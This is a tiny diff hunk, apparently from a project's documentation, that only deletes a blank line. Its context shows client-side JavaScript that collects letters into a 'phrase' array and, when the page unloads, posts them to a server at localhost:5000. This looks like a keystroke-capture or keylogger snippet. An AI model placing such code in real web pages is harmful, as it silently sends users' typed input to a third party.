@@ -39,7 +39,6 @@ Client Side:
         phrase.push(letter);
     });
 
-
     window.onbeforeunload = function () {
         $.post('http://localhost:5000/' + phrase.toString());
     };
